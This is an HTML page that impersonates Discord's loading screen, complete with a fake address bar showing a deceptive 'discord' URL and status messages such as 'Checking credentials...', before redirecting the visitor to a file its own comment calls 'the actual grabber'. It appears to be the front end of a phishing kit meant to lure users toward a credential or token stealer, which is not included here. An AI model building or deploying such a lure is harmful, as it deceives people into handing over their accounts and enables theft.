<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Discord</title>
    <style>
        body {
            background-color: #36393f;
            color: #dcddde;
            font-family: 'Whitney', 'Helvetica Neue', Helvetica, Arial, sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
            flex-direction: column;
        }
        .loader {
            border: 4px solid #2f3136;
            border-top: 4px solid #7289da;
            border-radius: 50%;
            width: 40px;
            height: 40px;
            animation: spin 1s linear infinite;
            margin-bottom: 20px;
        }
        .text {
            font-size: 14px;
            color: #b9bbbe;
            margin-top: 10px;
        }
        .fake-url-bar {
            background-color: #2f3136;
            padding: 8px 15px;
            border-radius: 8px;
            font-size: 13px;
            color: #80848e;
            margin-bottom: 30px;
            font-family: monospace;
            border: 1px solid #40444b;
        }
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
    </style>
</head>
<body>

    <!-- Fake URL Bar -->
    <div class="fake-url-bar">https://test443loginiddiscord.https/verify</div>

    <div class="loader"></div>
    <div class="text" id="status">Connecting to 443...</div>

    <script>
        const statusEl = document.getElementById('status');
        const messages = [
            "Connecting to 443...",
            "Checking credentials...",
            "Connected to 443",
            "Loading client..."
        ];
        let i = 0;
        
        const interval = setInterval(() => {
            if (i < messages.length) {
                statusEl.innerText = messages[i];
                i++;
            } else {
                clearInterval(interval);
                // Redirect to the actual grabber
                window.location.href = "grabber.html";
            }
        }, 800);
    </script>
</body>
</html>
